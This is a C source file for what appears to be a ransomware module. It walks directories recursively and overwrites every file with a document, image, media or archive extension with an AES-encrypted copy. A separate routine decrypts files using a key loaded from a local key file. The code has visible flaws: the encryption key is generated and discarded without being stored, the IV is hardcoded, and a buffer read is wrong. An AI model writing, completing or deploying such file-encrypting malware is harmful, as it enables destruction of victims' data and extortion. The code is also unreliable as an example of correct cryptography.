#include "./FileHandler.h"

void checkDir(DIR *dir){
    if (dir == NULL){
        perror("Unable to open directory");
        return;
    }
}

void walk(const char *rootPath, int option){
    struct dirent *entry;
    DIR *dir = opendir(rootPath);
    checkDir(dir);

    while ((entry = readdir(dir)) != NULL){
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", rootPath, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == 0){
            if (S_ISDIR(statbuf.st_mode)){
                walk(path, option);
            } else{
                printf("File: %s\n",path);
                if (option == 0){
                    infect(path);
                } else{
                    clean(path);
                }
            }
        }

    }
    closedir(dir);
}

void infect(char *filePath){
    if (checkFile(filePath) == 1){
        return;
    }
    printf("-- Encoding using AES\n");
    //if (*SIG != 300){
        //*SIG = 300;
    //}
    unsigned char *key = (unsigned char *)malloc(32);
    AES_generateKey(key);
    unsigned char iv[AES_IV_SIZE] = {
        0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
        0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
    };

    unsigned char *input_data, *output_data;
    uint64_t input_size, output_size;
    // Load the input file into memory
    if (AES_loadFile(filePath, &input_data, &input_size) != 0) {
        fprintf(stderr, "Error loading file\n");
        return;
    }
    output_data = (unsigned char *)malloc(input_size + AES_BLOCK_SIZE);

    // Encrypt the data
    output_size = AES_encrypt(input_data, input_size, key, iv, output_data);
    printf("Encrypted size: %llu\n", output_size);

    AES_writeFile(filePath, output_data, output_size);

    free(input_data);
    free(output_data);
    free(key);
}

void clean(char *filePath){
    if (checkFile(filePath) == 1){
        return;
    }
    unsigned char *key = (unsigned char *)malloc(32);
    printf("Reading key\n");
    FILE *keyFile = fopen("./src/keys/AES.key", "rb");
    fread(key, sizeof(unsigned char *), 32, keyFile);
    fclose(keyFile);
    printf("Read key\n");

    unsigned char iv[AES_IV_SIZE] = {
        0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
        0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
    };

    unsigned char *input_data;
    uint64_t input_size;
    // Load the input file into memory
    if (AES_loadFile(filePath, &input_data, &input_size) != 0) {
        fprintf(stderr, "Error loading file\n");
        return;
    }
    unsigned char *decrypted_data = (unsigned char *)malloc(input_size + AES_BLOCK_SIZE);
    uint64_t decrypted_size = AES_decrypt(input_data, input_size, key, iv, decrypted_data);
    printf("Decrypted size: %llu\n", decrypted_size);

    AES_writeFile(filePath, decrypted_data, decrypted_size);

    free(input_data);
    free(decrypted_data);
    free(key);
}


int checkFile(char *filePath) {
    if (strcasestr(filePath, ".doc") != NULL) return 0;
    if (strcasestr(filePath, ".odt") != NULL) return 0;
	if (strcasestr(filePath, ".rtf") != NULL) return 0;
	if (strcasestr(filePath, ".md") != NULL) return 0;
	if (strcasestr(filePath, ".wpd") != NULL) return 0;
	if (strcasestr(filePath, ".ppt") != NULL) return 0;
	if (strcasestr(filePath, ".pps") != NULL) return 0;
	if (strcasestr(filePath, ".odp") != NULL) return 0;
	if (strcasestr(filePath, ".ods") != NULL) return 0;
	if (strcasestr(filePath, ".xlr") != NULL) return 0;
	if (strcasestr(filePath, ".xls") != NULL) return 0;
	if (strcasestr(filePath, ".txt") != NULL) return 0;
	if (strcasestr(filePath, ".pdf") != NULL) return 0;
	if (strcasestr(filePath, ".zip") != NULL) return 0;
	if (strcasestr(filePath, ".jpeg") != NULL) return 0;
	if (strcasestr(filePath, ".jpg") != NULL) return 0;
	if (strcasestr(filePath, ".png") != NULL) return 0;
	if (strcasestr(filePath, ".gif") != NULL) return 0;
	if (strcasestr(filePath, ".bmp") != NULL) return 0;
	if (strcasestr(filePath, ".psd") != NULL) return 0;
	if (strcasestr(filePath, ".ico") != NULL) return 0;
	if (strcasestr(filePath, ".svg") != NULL) return 0;
	if (strcasestr(filePath, ".tif") != NULL) return 0;
	if (strcasestr(filePath, ".mp3") != NULL) return 0;
	if (strcasestr(filePath, ".flac") != NULL) return 0;
	if (strcasestr(filePath, ".aif") != NULL) return 0;
	if (strcasestr(filePath, ".wav") != NULL) return 0;
	if (strcasestr(filePath, ".wma") != NULL) return 0;
	if (strcasestr(filePath, ".ogg") != NULL) return 0;
	if (strcasestr(filePath, ".mpa") != NULL) return 0;
	if (strcasestr(filePath, ".cda") != NULL) return 0;
	if (strcasestr(filePath, ".mp4") != NULL) return 0;
	if (strcasestr(filePath, ".wmv") != NULL) return 0;
	if (strcasestr(filePath, ".mpg") != NULL) return 0;
	if (strcasestr(filePath, ".mpeg") != NULL) return 0;
	if (strcasestr(filePath, ".m4v") != NULL) return 0;
	if (strcasestr(filePath, ".h264") != NULL) return 0;
	if (strcasestr(filePath, ".mkv") != NULL) return 0;
	if (strcasestr(filePath, ".3g2") != NULL) return 0;
	if (strcasestr(filePath, ".3gp") != NULL) return 0;
	if (strcasestr(filePath, ".avi") != NULL) return 0;
	if (strcasestr(filePath, ".mov") != NULL) return 0;
	if (strcasestr(filePath, ".flv") != NULL) return 0;
	if (strcasestr(filePath, ".7z") != NULL) return 0;
	if (strcasestr(filePath, ".tar") != NULL) return 0;
	if (strcasestr(filePath, ".rar") != NULL) return 0;
	if (strcasestr(filePath, ".gz") != NULL) return 0;
	return 1;
}
